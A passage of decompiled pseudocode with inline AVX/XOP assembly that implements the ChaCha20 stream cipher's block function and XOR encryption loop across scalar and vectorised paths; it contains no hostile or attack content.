        v28 = __ROL4__((v643.m128i_i32[0] + *(_DWORD *)&v642[16]) ^ v645.m128i_i32[0], 16);
        *(_DWORD *)&v642[28] = __ROL4__((v644.m128i_i32[3] + v26) ^ v27, 7);
        v29 = v28 + v644.m128i_i32[0];
        v30 = __ROL4__((v28 + v644.m128i_i32[0]) ^ v643.m128i_i32[0], 12);
        *(_DWORD *)&v642[16] += v30 + v643.m128i_i32[0];
        v31 = __ROL4__(*(_DWORD *)&v642[16] ^ v28, 8);
        v32 = v31 + v29;
        v645.m128i_i32[0] = v31;
        v33 = __ROL4__((v643.m128i_i32[1] + *(_DWORD *)&v642[20]) ^ v645.m128i_i32[1], 16);
        v643.m128i_i32[0] = __ROL4__(v32 ^ v30, 7);
        v34 = v33 + v644.m128i_i32[1];
        v35 = __ROL4__((v33 + v644.m128i_i32[1]) ^ v643.m128i_i32[1], 12);
        *(_DWORD *)&v642[20] += v35 + v643.m128i_i32[1];
        v36 = __ROL4__(*(_DWORD *)&v642[20] ^ v33, 8);
        v37 = v36 + v34;
        v38 = __ROL4__((*(_DWORD *)&v642[28] + *(_DWORD *)&v642[8]) ^ v36, 16);
        v643.m128i_i32[1] = __ROL4__(v37 ^ v35, 7);
        v39 = v38 + v32;
        v40 = __ROL4__(v39 ^ *(_DWORD *)&v642[28], 12);
        *(_DWORD *)&v642[8] += v40 + *(_DWORD *)&v642[28];
        v645.m128i_i32[1] = __ROL4__(*(_DWORD *)&v642[8] ^ v38, 8);
        v644.m128i_i32[0] = v645.m128i_i32[1] + v39;
        v41 = __ROL4__((v643.m128i_i32[0] + *(_DWORD *)&v642[12]) ^ v644.m128i_i32[2], 16);
        *(_DWORD *)&v642[28] = __ROL4__((v645.m128i_i32[1] + v39) ^ v40, 7);
        v42 = v41 + v37;
        v43 = __ROL4__(v42 ^ v643.m128i_i32[0], 12);
        *(_DWORD *)&v642[12] += v43 + v643.m128i_i32[0];
        v644.m128i_i32[2] = __ROL4__(*(_DWORD *)&v642[12] ^ v41, 8);
        v644.m128i_i32[1] = v644.m128i_i32[2] + v42;
        v44 = __ROL4__((v643.m128i_i32[1] + *(_DWORD *)&v642[16]) ^ v644.m128i_i32[3], 16);
        v643.m128i_i32[0] = __ROL4__((v644.m128i_i32[2] + v42) ^ v43, 7);
        v45 = v44 + v643.m128i_i32[2];
        v46 = __ROL4__((v44 + v643.m128i_i32[2]) ^ v643.m128i_i32[1], 12);
        *(_DWORD *)&v642[16] += v46 + v643.m128i_i32[1];
        v47 = __ROL4__(*(_DWORD *)&v642[16] ^ v44, 8);
        v17 = v47 + v45;
        v644.m128i_i32[3] = v47;
        v48 = __ROL4__((*(_DWORD *)&v642[24] + *(_DWORD *)&v642[20]) ^ v645.m128i_i32[0], 16);
        v643.m128i_i32[1] = __ROL4__(v17 ^ v46, 7);
        v49 = v48 + v643.m128i_i32[3];
        v19 = v644.m128i_i32[2];
        v50 = __ROL4__((v48 + v643.m128i_i32[3]) ^ *(_DWORD *)&v642[24], 12);
        *(_DWORD *)&v642[20] += v50 + *(_DWORD *)&v642[24];
        v51 = __ROL4__(*(_DWORD *)&v642[20] ^ v48, 8);
        v15 = *(_DWORD *)&v642[8];
        v18 = v51 + v49;
        v645.m128i_i32[0] = v51;
        v16 = __ROL4__(v18 ^ v50, 7);
        v20 = (int)&v650[-1].m128i_i32[3] + 3;
      }
      while ( v650 != (const __m128i *)1 );
      v52 = a3;
      v53 = v646.m128i_i32[2] + v16;
      v54 = v647.m128i_i32[2] + v17;
      v55 = v647.m128i_i32[3] + v18;
      if ( a3 < 0x40 )
        break;
      v56 = a2[1].m128i_i32[0] ^ v53;
      *(_DWORD *)&v642[8] = a2->m128i_i32[0] ^ (*(_DWORD *)&v642[8] + 1634760805);
      v57 = a2[2].m128i_i32[0] ^ v54;
      v58 = a2[2].m128i_i32[1] ^ v55;
      v59 = a2[3].m128i_i32[0] ^ (v648.m128i_i32[2] + v644.m128i_i32[2]);
      v60 = a2[3].m128i_i32[2] ^ (v649 + v51);
      a1[1].m128i_i32[0] = v56;
      a1[2].m128i_i32[0] = v57;
      a1[2].m128i_i32[1] = v58;
      a1[3].m128i_i32[0] = v59;
      a1[3].m128i_i32[2] = v60;
      v61 = a2->m128i_i32[2] ^ (*(_DWORD *)&v642[16] + 2036477234);
      v62 = a2->m128i_i32[3] ^ (*(_DWORD *)&v642[20] + 1797285236);
      v63 = a2[1].m128i_i32[1] ^ (v646.m128i_i32[3] + *(_DWORD *)&v642[28]);
      v64 = a2[1].m128i_i32[2] ^ (v647.m128i_i32[0] + v643.m128i_i32[0]);
      a1->m128i_i32[1] = a2->m128i_i32[1] ^ (*(_DWORD *)&v642[12] + 857760878);
      a1->m128i_i32[2] = v61;
      a1->m128i_i32[3] = v62;
      a1[1].m128i_i32[1] = v63;
      a1[1].m128i_i32[2] = v64;
      v65 = a2[2].m128i_i32[2] ^ (v648.m128i_i32[0] + v644.m128i_i32[0]);
      v66 = a2[2].m128i_i32[3] ^ (v648.m128i_i32[1] + v644.m128i_i32[1]);
      v67 = a2[3].m128i_i32[1] ^ (v648.m128i_i32[3] + v644.m128i_i32[3]);
      v68 = a2[3].m128i_i32[3] ^ (HIDWORD(v649) + v645.m128i_i32[1]);
      a1[1].m128i_i32[3] = a2[1].m128i_i32[3] ^ (v647.m128i_i32[1] + v643.m128i_i32[1]);
      v69 = *(_DWORD *)&v642[8];
      a1[2].m128i_i32[2] = v65;
      a1[2].m128i_i32[3] = v66;
      a1[3].m128i_i32[1] = v67;
      a1[3].m128i_i32[3] = v68;
      a1->m128i_i32[0] = v69;
      LOBYTE(_EAX) = (_BYTE)a1 + 64;
      if ( a3 == 64 )
        return (char)_EAX;
      a2 += 4;
      a1 += 4;
      a3 -= 64;
    }
    *(_DWORD *)&v642[8] += 1634760805;
    *(_DWORD *)&v642[24] = v53;
    v643.m128i_i64[1] = __PAIR64__(v55, v54);
    v644.m128i_i32[2] += v648.m128i_i32[2];
    v645.m128i_i32[0] = v649 + v51;
    *(_DWORD *)&v642[12] += 857760878;
    *(_DWORD *)&v642[16] += 2036477234;
    *(_DWORD *)&v642[20] += 1797285236;
    *(_DWORD *)&v642[28] += v646.m128i_i32[3];
    v643.m128i_i32[0] += v647.m128i_i32[0];
    v643.m128i_i32[1] += v647.m128i_i32[1];
    v644.m128i_i32[0] += v648.m128i_i32[0];
    v644.m128i_i32[1] += v648.m128i_i32[1];
    v70 = 0;
    v644.m128i_i32[3] += v648.m128i_i32[3];
    v645.m128i_i32[1] += HIDWORD(v649);
    do
    {
      v71 = a2->m128i_i8[v70];
      v72 = v642[v70++ + 8];
      LOBYTE(_EAX) = v72 ^ v71;
      a1->m128i_i8[v70 - 1] = (char)_EAX;
      --v52;
    }
    while ( v52 );
    return (char)_EAX;
  }
  if ( (*(&dword_73C6D0 + 1) & 0x800) != 0 )
  {
    _EDI = (__int32 *)a1;
    v321 = a2;
    v322 = a3;
    _EDX = a4;
    _EBX = a5;
    __asm { vzeroupper }
    LODWORD(v649) = v651;
    _EAX = (const __m128i *)((char *)v650 + (_DWORD)&dword_4ACF00[-1224710] + 3);
    __asm { vmovdqu xmm3, xmmword ptr [ebx] }
    if ( a3 >= 0x100 )
    {
      HIDWORD(v649) = a4;
      v650 = a5;
      v326 = a3 - 256;
      _EBP = v642;
      __asm
      {
        vmovdqu xmm7, xmmword ptr [edx]
        vpshufd xmm0, xmm3, 0
        vpshufd xmm1, xmm3, 55h ; 'U'
        vpshufd xmm2, xmm3, 0AAh
        vpshufd xmm3, xmm3, 0FFh
        vpaddd  xmm0, xmm0, xmmword ptr [eax+30h]
        vpshufd xmm4, xmm7, 0
        vpshufd xmm5, xmm7, 55h ; 'U'
        vpsubd  xmm0, xmm0, xmmword ptr [eax+40h]
        vpshufd xmm6, xmm7, 0AAh
        vpshufd xmm7, xmm7, 0FFh
        vmovdqa xmmword ptr [ebp+40h], xmm0
        vmovdqa xmmword ptr [ebp+50h], xmm1
        vmovdqa xmmword ptr [ebp+60h], xmm2
        vmovdqa xmmword ptr [ebp+70h], xmm3
        vmovdqu xmm3, xmmword ptr [edx+10h]
        vmovdqa xmmword ptr [ebp-40h], xmm4
        vmovdqa xmmword ptr [ebp-30h], xmm5
        vmovdqa xmmword ptr [ebp-20h], xmm6
        vmovdqa xmmword ptr [ebp-10h], xmm7
        vmovdqa xmm7, xmmword ptr [eax+20h]
      }
      _EBX = &v626;
      __asm
      {
        vpshufd xmm0, xmm3, 0
        vpshufd xmm1, xmm3, 55h ; 'U'
        vpshufd xmm2, xmm3, 0AAh
        vpshufd xmm3, xmm3, 0FFh
        vpshufd xmm4, xmm7, 0
        vpshufd xmm5, xmm7, 55h ; 'U'
        vpshufd xmm6, xmm7, 0AAh
        vpshufd xmm7, xmm7, 0FFh
        vmovdqa xmmword ptr [ebp+0], xmm0
        vmovdqa xmmword ptr [ebp+10h], xmm1
        vmovdqa xmmword ptr [ebp+20h], xmm2
        vmovdqa xmmword ptr [ebp+30h], xmm3
        vmovdqa xmmword ptr [ebp-80h], xmm4
        vmovdqa xmmword ptr [ebp-70h], xmm5
        vmovdqa xmmword ptr [ebp-60h], xmm6
        vmovdqa xmmword ptr [ebp-50h], xmm7
      }
      v350 = a2 + 8;
      _EDI = a1 + 8;
      do
      {
        __asm
        {
          vmovdqa xmm1, xmmword ptr [ebp-70h]
          vmovdqa xmm2, xmmword ptr [ebp-60h]
          vmovdqa xmm3, xmmword ptr [ebp-50h]
          vmovdqa xmm5, xmmword ptr [ebp-30h]
          vmovdqa xmm6, xmmword ptr [ebp-20h]
          vmovdqa xmm7, xmmword ptr [ebp-10h]
          vmovdqa xmmword ptr [ebx-70h], xmm1
          vmovdqa xmmword ptr [ebx-60h], xmm2
          vmovdqa xmmword ptr [ebx-50h], xmm3
          vmovdqa xmmword ptr [ebx-30h], xmm5
          vmovdqa xmmword ptr [ebx-20h], xmm6
          vmovdqa xmmword ptr [ebx-10h], xmm7
          vmovdqa xmm2, xmmword ptr [ebp+20h]
          vmovdqa xmm3, xmmword ptr [ebp+30h]
          vmovdqa xmm4, xmmword ptr [ebp+40h]
          vmovdqa xmm5, xmmword ptr [ebp+50h]
          vmovdqa xmm6, xmmword ptr [ebp+60h]
          vmovdqa xmm7, xmmword ptr [ebp+70h]
          vpaddd  xmm4, xmm4, xmmword ptr [eax+40h]
          vmovdqa xmmword ptr [ebx+20h], xmm2
          vmovdqa xmmword ptr [ebx+30h], xmm3
          vmovdqa xmmword ptr [ebx+40h], xmm4
          vmovdqa xmmword ptr [ebx+50h], xmm5
          vmovdqa xmmword ptr [ebx+60h], xmm6
          vmovdqa xmmword ptr [ebx+70h], xmm7
          vmovdqa xmmword ptr [ebp+40h], xmm4
          vmovdqa xmm0, xmmword ptr [ebp-80h]
          vmovdqa xmm6, xmm4
          vmovdqa xmm3, xmmword ptr [ebp-40h]
          vmovdqa xmm4, xmmword ptr [ebp+0]
          vmovdqa xmm5, xmmword ptr [ebp+10h]
        }
        v370 = 10;
        do
        {
          __asm
          {
            vpaddd  xmm0, xmm0, xmm3
            vpxor   xmm6, xmm6, xmm0
            vprotd  xmm6, xmm6, 10h
            vpaddd  xmm4, xmm4, xmm6
            vpxor   xmm2, xmm3, xmm4
            vmovdqa xmm1, xmmword ptr [ebx-70h]
            vprotd  xmm2, xmm2, 0Ch
            vmovdqa xmm3, xmmword ptr [ebx-30h]
            vpaddd  xmm0, xmm0, xmm2
            vmovdqa xmm7, xmmword ptr [ebx+50h]
            vpxor   xmm6, xmm6, xmm0
            vpaddd  xmm1, xmm1, xmm3
            vprotd  xmm6, xmm6, 8
            vmovdqa xmmword ptr [ebx-80h], xmm0
            vpaddd  xmm4, xmm4, xmm6
            vmovdqa xmmword ptr [ebx+40h], xmm6
            vpxor   xmm2, xmm2, xmm4
            vpxor   xmm7, xmm7, xmm1
            vprotd  xmm2, xmm2, 7
            vmovdqa xmmword ptr [ebx], xmm4
            vprotd  xmm7, xmm7, 10h
            vmovdqa xmmword ptr [ebx-40h], xmm2
            vpaddd  xmm5, xmm5, xmm7
            vmovdqa xmm4, xmmword ptr [ebx+20h]
            vpxor   xmm3, xmm3, xmm5
            vmovdqa xmm0, xmmword ptr [ebx-60h]
            vprotd  xmm3, xmm3, 0Ch
            vmovdqa xmm2, xmmword ptr [ebx-20h]
            vpaddd  xmm1, xmm1, xmm3
            vmovdqa xmm6, xmmword ptr [ebx+60h]
            vpxor   xmm7, xmm7, xmm1
            vpaddd  xmm0, xmm0, xmm2
            vprotd  xmm7, xmm7, 8
            vmovdqa xmmword ptr [ebx-70h], xmm1
            vpaddd  xmm5, xmm5, xmm7
            vmovdqa xmmword ptr [ebx+50h], xmm7
            vpxor   xmm3, xmm3, xmm5
            vpxor   xmm6, xmm6, xmm0
            vprotd  xmm3, xmm3, 7
            vmovdqa xmmword ptr [ebx+10h], xmm5
            vprotd  xmm6, xmm6, 10h
            vmovdqa xmmword ptr [ebx-30h], xmm3
            vpaddd  xmm4, xmm4, xmm6
            vmovdqa xmm5, xmmword ptr [ebx+30h]
            vpxor   xmm2, xmm2, xmm4
            vmovdqa xmm1, xmmword ptr [ebx-50h]
            vprotd  xmm2, xmm2, 0Ch
            vmovdqa xmm3, xmmword ptr [ebx-10h]
            vpaddd  xmm0, xmm0, xmm2
            vmovdqa xmm7, xmmword ptr [ebx+70h]
            vpxor   xmm6, xmm6, xmm0
            vpaddd  xmm1, xmm1, xmm3
            vprotd  xmm6, xmm6, 8
            vmovdqa xmmword ptr [ebx-60h], xmm0
            vpaddd  xmm4, xmm4, xmm6
            vmovdqa xmmword ptr [ebx+60h], xmm6
            vpxor   xmm2, xmm2, xmm4
            vpxor   xmm7, xmm7, xmm1
            vprotd  xmm2, xmm2, 7
            vprotd  xmm7, xmm7, 10h
            vmovdqa xmmword ptr [ebx-20h], xmm2
            vpaddd  xmm5, xmm5, xmm7
            vpxor   xmm3, xmm3, xmm5
            vmovdqa xmm0, xmmword ptr [ebx-80h]
            vprotd  xmm3, xmm3, 0Ch
            vmovdqa xmm2, xmmword ptr [ebx-30h]
            vpaddd  xmm1, xmm1, xmm3
            vpxor   xmm7, xmm7, xmm1
            vpaddd  xmm0, xmm0, xmm2
            vprotd  xmm7, xmm7, 8
            vmovdqa xmmword ptr [ebx-50h], xmm1
            vpaddd  xmm5, xmm5, xmm7
            vpxor   xmm3, xmm3, xmm5
            vpxor   xmm6, xmm7, xmm0
            vprotd  xmm3, xmm3, 7
            vprotd  xmm6, xmm6, 10h
            vmovdqa xmmword ptr [ebx-10h], xmm3
            vpaddd  xmm4, xmm4, xmm6
            vpxor   xmm2, xmm2, xmm4
            vmovdqa xmm1, xmmword ptr [ebx-70h]
            vprotd  xmm2, xmm2, 0Ch
            vmovdqa xmm3, xmmword ptr [ebx-20h]
            vpaddd  xmm0, xmm0, xmm2
            vmovdqa xmm7, xmmword ptr [ebx+40h]
            vpxor   xmm6, xmm6, xmm0
            vpaddd  xmm1, xmm1, xmm3
            vprotd  xmm6, xmm6, 8
            vmovdqa xmmword ptr [ebx-80h], xmm0
            vpaddd  xmm4, xmm4, xmm6
            vmovdqa xmmword ptr [ebx+70h], xmm6
            vpxor   xmm2, xmm2, xmm4
            vpxor   xmm7, xmm7, xmm1
            vprotd  xmm2, xmm2, 7
            vmovdqa xmmword ptr [ebx+20h], xmm4
            vprotd  xmm7, xmm7, 10h
            vmovdqa xmmword ptr [ebx-30h], xmm2
            vpaddd  xmm5, xmm5, xmm7
            vmovdqa xmm4, xmmword ptr [ebx]
            vpxor   xmm3, xmm3, xmm5
            vmovdqa xmm0, xmmword ptr [ebx-60h]
            vprotd  xmm3, xmm3, 0Ch
            vmovdqa xmm2, xmmword ptr [ebx-10h]
            vpaddd  xmm1, xmm1, xmm3
            vmovdqa xmm6, xmmword ptr [ebx+50h]
            vpxor   xmm7, xmm7, xmm1
            vpaddd  xmm0, xmm0, xmm2
            vprotd  xmm7, xmm7, 8
            vmovdqa xmmword ptr [ebx-70h], xmm1
            vpaddd  xmm5, xmm5, xmm7
            vmovdqa xmmword ptr [ebx+40h], xmm7
            vpxor   xmm3, xmm3, xmm5
            vpxor   xmm6, xmm6, xmm0
            vprotd  xmm3, xmm3, 7
            vmovdqa xmmword ptr [ebx+30h], xmm5
            vprotd  xmm6, xmm6, 10h
            vmovdqa xmmword ptr [ebx-20h], xmm3
            vpaddd  xmm4, xmm4, xmm6
            vmovdqa xmm5, xmmword ptr [ebx+10h]
            vpxor   xmm2, xmm2, xmm4
            vmovdqa xmm1, xmmword ptr [ebx-50h]
            vprotd  xmm2, xmm2, 0Ch
            vmovdqa xmm3, xmmword ptr [ebx-40h]
            vpaddd  xmm0, xmm0, xmm2
            vmovdqa xmm7, xmmword ptr [ebx+60h]
            vpxor   xmm6, xmm6, xmm0
            vpaddd  xmm1, xmm1, xmm3
            vprotd  xmm6, xmm6, 8
            vmovdqa xmmword ptr [ebx-60h], xmm0
            vpaddd  xmm4, xmm4, xmm6
            vmovdqa xmmword ptr [ebx+50h], xmm6
            vpxor   xmm2, xmm2, xmm4
            vpxor   xmm7, xmm7, xmm1
            vprotd  xmm2, xmm2, 7
            vprotd  xmm7, xmm7, 10h
            vmovdqa xmmword ptr [ebx-10h], xmm2
            vpaddd  xmm5, xmm5, xmm7
            vpxor   xmm3, xmm3, xmm5
            vmovdqa xmm0, xmmword ptr [ebx-80h]
            vprotd  xmm3, xmm3, 0Ch
            vpaddd  xmm1, xmm1, xmm3
            vmovdqa xmm6, xmmword ptr [ebx+40h]
            vpxor   xmm7, xmm7, xmm1
            vprotd  xmm7, xmm7, 8
            vmovdqa xmmword ptr [ebx-50h], xmm1
            vpaddd  xmm5, xmm5, xmm7
            vmovdqa xmmword ptr [ebx+60h], xmm7
            vpxor   xmm3, xmm3, xmm5
            vprotd  xmm3, xmm3, 7
          }
          --v370;
        }
        while ( v370 );
        __asm
        {
          vmovdqa xmmword ptr [ebx-40h], xmm3
          vmovdqa xmmword ptr [ebx], xmm4
          vmovdqa xmmword ptr [ebx+10h], xmm5
          vmovdqa xmmword ptr [ebx+40h], xmm6
          vmovdqa xmmword ptr [ebx+60h], xmm7
          vmovdqa xmm1, xmmword ptr [ebx-70h]
          vmovdqa xmm2, xmmword ptr [ebx-60h]
          vmovdqa xmm3, xmmword ptr [ebx-50h]
          vpaddd  xmm0, xmm0, xmmword ptr [ebp-80h]
          vpaddd  xmm1, xmm1, xmmword ptr [ebp-70h]
          vpaddd  xmm2, xmm2, xmmword ptr [ebp-60h]
          vpaddd  xmm3, xmm3, xmmword ptr [ebp-50h]
          vpunpckldq xmm6, xmm0, xmm1
          vpunpckldq xmm7, xmm2, xmm3
          vpunpckhdq xmm0, xmm0, xmm1
          vpunpckhdq xmm2, xmm2, xmm3
          vpunpcklqdq xmm1, xmm6, xmm7
          vpunpckhqdq xmm6, xmm6, xmm7
          vpunpcklqdq xmm7, xmm0, xmm2
          vpunpckhqdq xmm3, xmm0, xmm2
          vpxor   xmm4, xmm1, xmmword ptr [esi-80h]
          vpxor   xmm5, xmm6, xmmword ptr [esi-40h]
          vpxor   xmm6, xmm7, xmmword ptr [esi]
          vpxor   xmm7, xmm3, xmmword ptr [esi+40h]
          vmovdqa xmm0, xmmword ptr [ebx-40h]
          vmovdqa xmm1, xmmword ptr [ebx-30h]
          vmovdqa xmm2, xmmword ptr [ebx-20h]
          vmovdqa xmm3, xmmword ptr [ebx-10h]
          vmovdqu xmmword ptr [edi-80h], xmm4
          vmovdqu xmmword ptr [edi-40h], xmm5
          vmovdqu xmmword ptr [edi], xmm6
          vmovdqu xmmword ptr [edi+40h], xmm7
        }
        _EDI = _EDI + 1;
        __asm
        {
          vpaddd  xmm0, xmm0, xmmword ptr [ebp-40h]
          vpaddd  xmm1, xmm1, xmmword ptr [ebp-30h]
          vpaddd  xmm2, xmm2, xmmword ptr [ebp-20h]
          vpaddd  xmm3, xmm3, xmmword ptr [ebp-10h]
          vpunpckldq xmm6, xmm0, xmm1
          vpunpckldq xmm7, xmm2, xmm3
          vpunpckhdq xmm0, xmm0, xmm1
          vpunpckhdq xmm2, xmm2, xmm3
          vpunpcklqdq xmm1, xmm6, xmm7
          vpunpckhqdq xmm6, xmm6, xmm7
          vpunpcklqdq xmm7, xmm0, xmm2
          vpunpckhqdq xmm3, xmm0, xmm2
          vpxor   xmm4, xmm1, xmmword ptr [esi-80h]
          vpxor   xmm5, xmm6, xmmword ptr [esi-40h]
          vpxor   xmm6, xmm7, xmmword ptr [esi]
          vpxor   xmm7, xmm3, xmmword ptr [esi+40h]
          vmovdqa xmm0, xmmword ptr [ebx]
          vmovdqa xmm1, xmmword ptr [ebx+10h]
          vmovdqa xmm2, xmmword ptr [ebx+20h]
          vmovdqa xmm3, xmmword ptr [ebx+30h]
          vmovdqu xmmword ptr [edi-80h], xmm4
          vmovdqu xmmword ptr [edi-40h], xmm5
          vmovdqu xmmword ptr [edi], xmm6
          vmovdqu xmmword ptr [edi+40h], xmm7
        }
        ++_EDI;
        __asm
        {
          vpaddd  xmm0, xmm0, xmmword ptr [ebp+0]
          vpaddd  xmm1, xmm1, xmmword ptr [ebp+10h]
          vpaddd  xmm2, xmm2, xmmword ptr [ebp+20h]
          vpaddd  xmm3, xmm3, xmmword ptr [ebp+30h]
          vpunpckldq xmm6, xmm0, xmm1
          vpunpckldq xmm7, xmm2, xmm3
          vpunpckhdq xmm0, xmm0, xmm1
          vpunpckhdq xmm2, xmm2, xmm3
          vpunpcklqdq xmm1, xmm6, xmm7
          vpunpckhqdq xmm6, xmm6, xmm7
          vpunpcklqdq xmm7, xmm0, xmm2
          vpunpckhqdq xmm3, xmm0, xmm2
          vpxor   xmm4, xmm1, xmmword ptr [esi-80h]
          vpxor   xmm5, xmm6, xmmword ptr [esi-40h]
          vpxor   xmm6, xmm7, xmmword ptr [esi]
          vpxor   xmm7, xmm3, xmmword ptr [esi+40h]
          vmovdqa xmm0, xmmword ptr [ebx+40h]
          vmovdqa xmm1, xmmword ptr [ebx+50h]
          vmovdqa xmm2, xmmword ptr [ebx+60h]
          vmovdqa xmm3, xmmword ptr [ebx+70h]
          vmovdqu xmmword ptr [edi-80h], xmm4
          vmovdqu xmmword ptr [edi-40h], xmm5
          vmovdqu xmmword ptr [edi], xmm6
          vmovdqu xmmword ptr [edi+40h], xmm7
        }
        ++_EDI;
        __asm
        {
          vpaddd  xmm0, xmm0, xmmword ptr [ebp+40h]
          vpaddd  xmm1, xmm1, xmmword ptr [ebp+50h]
          vpaddd  xmm2, xmm2, xmmword ptr [ebp+60h]
          vpaddd  xmm3, xmm3, xmmword ptr [ebp+70h]
          vpunpckldq xmm6, xmm0, xmm1
          vpunpckldq xmm7, xmm2, xmm3
          vpunpckhdq xmm0, xmm0, xmm1
          vpunpckhdq xmm2, xmm2, xmm3
          vpunpcklqdq xmm1, xmm6, xmm7
          vpunpckhqdq xmm6, xmm6, xmm7
          vpunpcklqdq xmm7, xmm0, xmm2
          vpunpckhqdq xmm3, xmm0, xmm2
          vpxor   xmm4, xmm1, xmmword ptr [esi-80h]
          vpxor   xmm5, xmm6, xmmword ptr [esi-40h]
          vpxor   xmm6, xmm7, xmmword ptr [esi]
          vpxor   xmm7, xmm3, xmmword ptr [esi+40h]
        }
        v350 += 16;
        __asm
        {
          vmovdqu xmmword ptr [edi-80h], xmm4
          vmovdqu xmmword ptr [edi-40h], xmm5
          vmovdqu xmmword ptr [edi], xmm6
          vmovdqu xmmword ptr [edi+40h], xmm7
        }
        _EDI = _EDI + 13;
        v284 = v326 < 0x100;
        v326 -= 256;
      }
      while ( !v284 );
      v322 = v326 + 256;
      if ( !v322 )
      {
LABEL_46:
        __asm { vzeroupper }
        return (char)_EAX;
      }
      _EBX = v650;
      v321 = v350 - 8;
      _EDX = (const __m128i *)HIDWORD(v649);
      _EDI = _EDI[-8].m128i_i32;
      __asm
      {
        vmovd   xmm2, dword ptr [ebp+40h]
        vmovdqu xmm3, xmmword ptr [ebx]
        vpaddd  xmm2, xmm2, xmmword ptr [eax+60h]
        vpand   xmm3, xmm3, xmmword ptr [eax+70h]
        vpor    xmm3, xmm3, xmm2
      }
    }
    __asm
    {
      vmovdqa xmm0, xmmword ptr [eax+20h]
      vmovdqu xmm1, xmmword ptr [edx]
      vmovdqu xmm2, xmmword ptr [edx+10h]
      vmovdqa xmm6, xmmword ptr ds:(loc_4AC015 - 4AC015h)[eax]
      vmovdqa xmm7, xmmword ptr [eax+10h]
      vmovdqa [esp+21Ch+var_21C], xmm0
      vmovdqa [esp+21Ch+var_20C], xmm1
      vmovdqa [esp+21Ch+var_1FC], xmm2
      vmovdqa [esp+21Ch+var_1EC], xmm3
    }
    v578 = 10;
    while ( 1 )
    {
      do
      {
        __asm
        {
          vpaddd  xmm0, xmm0, xmm1
          vpxor   xmm3, xmm3, xmm0
          vprotd  xmm3, xmm3, 10h
          vpaddd  xmm2, xmm2, xmm3
          vpxor   xmm1, xmm1, xmm2
          vprotd  xmm1, xmm1, 0Ch
          vpaddd  xmm0, xmm0, xmm1
          vpxor   xmm3, xmm3, xmm0
          vprotd  xmm3, xmm3, 8
          vpaddd  xmm2, xmm2, xmm3
          vpxor   xmm1, xmm1, xmm2
          vprotd  xmm1, xmm1, 7
          vpshufd xmm2, xmm2, 4Eh ; 'N'
          vpshufd xmm1, xmm1, 39h ; '9'
          vpshufd xmm3, xmm3, 93h
          vpaddd  xmm0, xmm0, xmm1
          vpxor   xmm3, xmm3, xmm0
          vprotd  xmm3, xmm3, 10h
          vpaddd  xmm2, xmm2, xmm3
          vpxor   xmm1, xmm1, xmm2
          vprotd  xmm1, xmm1, 0Ch
          vpaddd  xmm0, xmm0, xmm1
          vpxor   xmm3, xmm3, xmm0
          vprotd  xmm3, xmm3, 8
          vpaddd  xmm2, xmm2, xmm3
          vpxor   xmm1, xmm1, xmm2
          vprotd  xmm1, xmm1, 7
          vpshufd xmm2, xmm2, 4Eh ; 'N'
          vpshufd xmm1, xmm1, 93h
          vpshufd xmm3, xmm3, 39h ; '9'
        }
        --v578;
      }
      while ( v578 );
      __asm
      {
        vpaddd  xmm0, xmm0, [esp+21Ch+var_21C]
        vpaddd  xmm1, xmm1, [esp+21Ch+var_20C]
        vpaddd  xmm2, xmm2, [esp+21Ch+var_1FC]
        vpaddd  xmm3, xmm3, [esp+21Ch+var_1EC]
      }
      if ( v322 < 0x40 )
        break;
      __asm
      {
        vpxor   xmm0, xmm0, xmmword ptr [esi]
        vpxor   xmm1, xmm1, xmmword ptr [esi+10h]
        vpxor   xmm2, xmm2, xmmword ptr [esi+20h]
        vpxor   xmm3, xmm3, xmmword ptr [esi+30h]
      }
      v321 += 4;
      __asm
      {
        vmovdqu xmmword ptr [edi], xmm0
        vmovdqu xmmword ptr [edi+10h], xmm1
        vmovdqu xmmword ptr [edi+20h], xmm2
        vmovdqu xmmword ptr [edi+30h], xmm3
      }
      _EDI += 16;
      v322 -= 64;
      if ( !v322 )
        goto LABEL_46;
      __asm
      {
        vmovdqa xmm3, xmmword ptr [eax+50h]
        vmovdqa xmm0, [esp+21Ch+var_21C]
        vmovdqa xmm1, [esp+21Ch+var_20C]
        vmovdqa xmm2, [esp+21Ch+var_1FC]
        vpaddd  xmm3, xmm3, [esp+21Ch+var_1EC]
      }
      v578 = 10;
      __asm { vmovdqa [esp+21Ch+var_1EC], xmm3 }
    }
    __asm
    {
      vmovdqa [esp+21Ch+var_21C], xmm0
      vmovdqa [esp+21Ch+var_20C], xmm1
      vmovdqa [esp+21Ch+var_1FC], xmm2
      vmovdqa [esp+21Ch+var_1EC], xmm3
    }
    v614 = 0;
    do
    {
      v615 = v618.m128i_i8[v614];
      v616 = v321->m128i_i8[v614++];
      LOBYTE(_EAX) = v616 ^ v615;
      *((_BYTE *)_EDI + v614 - 1) = (_BYTE)_EAX;
      --v322;
    }
    while ( v322 );
    goto LABEL_46;
  }
  v73 = a1;
  v74 = a2;
  v75 = a3;
  v76 = a4;
  LODWORD(v649) = v651;
  _EAX = (const __m128i *)((char *)v650 + (_DWORD)&dword_4ACF00[-1224710] + 3);
  v77 = _mm_loadu_si128(a5);
  if ( a3 >= 0x100 )
  {
    HIDWORD(v649) = a4;
    v650 = a5;
    v78 = a3 - 256;
    v79 = _mm_loadu_si128(a4);
    v645 = _mm_sub_epi32(_mm_add_epi32(_mm_shuffle_epi32(v77, 0), _EAX[3]), _EAX[4]);
    v646 = _mm_shuffle_epi32(v77, 85);
    v647 = _mm_shuffle_epi32(v77, 170);
    v648 = _mm_shuffle_epi32(v77, 255);
    v80 = _mm_loadu_si128(a4 + 1);
    v638 = _mm_shuffle_epi32(v79, 0);
    v639 = _mm_shuffle_epi32(v79, 85);
    v640 = _mm_shuffle_epi32(v79, 170);
    v641 = _mm_shuffle_epi32(v79, 255);
    si128 = _mm_load_si128(_EAX + 2);
    *(__m128i *)v642 = _mm_shuffle_epi32(v80, 0);
    *(__m128i *)&v642[16] = _mm_shuffle_epi32(v80, 85);
    v643 = _mm_shuffle_epi32(v80, 170);
    v644 = _mm_shuffle_epi32(v80, 255);
    v634 = _mm_shuffle_epi32(si128, 0);
    v635 = _mm_shuffle_epi32(si128, 85);
    v636 = _mm_shuffle_epi32(si128, 170);
    v637 = _mm_shuffle_epi32(si128, 255);
    v82 = a2 + 8;
    v83 = a1 + 8;
    do
    {
      v84 = _mm_load_si128(&v636);
      v85 = _mm_load_si128(&v637);
      v86 = _mm_load_si128(&v639);
      v87 = _mm_load_si128(&v640);
      v88 = _mm_load_si128(&v641);
      v619 = _mm_load_si128(&v635);
      v620 = v84;
      v621 = v85;
      v623 = v86;
      v624 = v87;
      v625 = v88;
      v89 = _mm_load_si128(&v644);
